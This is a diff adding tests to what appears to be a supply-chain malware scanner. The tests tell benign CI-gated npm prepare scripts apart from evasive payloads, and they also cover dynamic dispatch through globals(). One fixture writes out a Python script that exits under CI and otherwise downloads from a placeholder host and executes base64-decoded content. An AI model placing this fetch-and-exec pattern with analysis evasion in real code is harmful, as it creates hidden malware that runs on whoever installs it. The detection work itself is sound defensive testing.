@@ -4326,3 +4326,65 @@ class TestAWordIsNotKeyMaterial:
     )
     def test_key_material_is(self, value: bytes) -> None:
         assert NOT_A_SECRET.match(value) is None
+
+
+class TestGatingOnCiIsWhatPrepareScriptsDo:
+    """`SUSPECT.ANTI_ANALYSIS.001` was 70 findings across 49 of the first 547
+    repositories and the common shape was an npm `prepare` script:
+
+        if (process.env.CI || process.env.DOCKER_BUILD) { process.exit(0) }
+        execSync('husky install')
+
+    An environment check and a process start. The check itself is genuinely a
+    capability -- the primitive's own positive test is `if os.environ.get('CI'): return`,
+    which is both the husky idiom and the textbook install-hook evasion, written
+    identically -- so nothing in the FORM tells them apart and the composite has to ask
+    what else the file does. Decoding something or reaching the network is a payload
+    worth gating. Starting a process is what build tooling does.
+
+    And PyTorch re-exports thirteen names with `globals()[name] = getattr(...)`, which
+    is a write into a namespace rather than a reach into one.
+    """
+
+    def test_a_prepare_script_is_quiet(self, tmp_path) -> None:
+        scripts = tmp_path / "scripts"
+        scripts.mkdir()
+        (scripts / "prepare.mjs").write_bytes(
+            b"import { execSync } from 'node:child_process'\n"
+            b"if (process.env.CI || process.env.DOCKER_BUILD) { process.exit(0) }\n"
+            b"execSync('husky install')\n"
+        )
+        assert "SUSPECT.ANTI_ANALYSIS.001" not in flagged(tmp_path)
+
+    def test_the_same_check_guarding_a_payload_is_not(self, tmp_path) -> None:
+        scripts = tmp_path / "agent"
+        scripts.mkdir()
+        (scripts / "boot.py").write_bytes(
+            assemble(
+                "import os, base64, urllib.request\n",
+                "if os.environ.get('CI'):\n    raise SystemExit(0)\n",
+                "blob = urllib.request.urlopen('https://x.test/p').read()\n",
+                "exec(base64.b64decode(blob))\n",
+            ).encode()
+        )
+        assert "SUSPECT.ANTI_ANALYSIS.001" in flagged(tmp_path)
+
+    def test_a_write_into_globals_is_not_dispatch(self) -> None:
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        source = (
+            "import torch\n"
+            "for name in _names:\n"
+            "    globals()[name] = getattr(torch._C._dynamo.eval_frame, name)\n"
+        )
+        assert not [
+            h for h in PythonAnalyzer.analyse(source) if h.capability.name == "DYNAMIC_DISPATCH"
+        ]
+
+    def test_a_read_out_of_globals_still_is(self) -> None:
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        source = "def run(cmd):\n    return globals()[cmd]()\n"
+        assert [
+            h for h in PythonAnalyzer.analyse(source) if h.capability.name == "DYNAMIC_DISPATCH"
+        ]
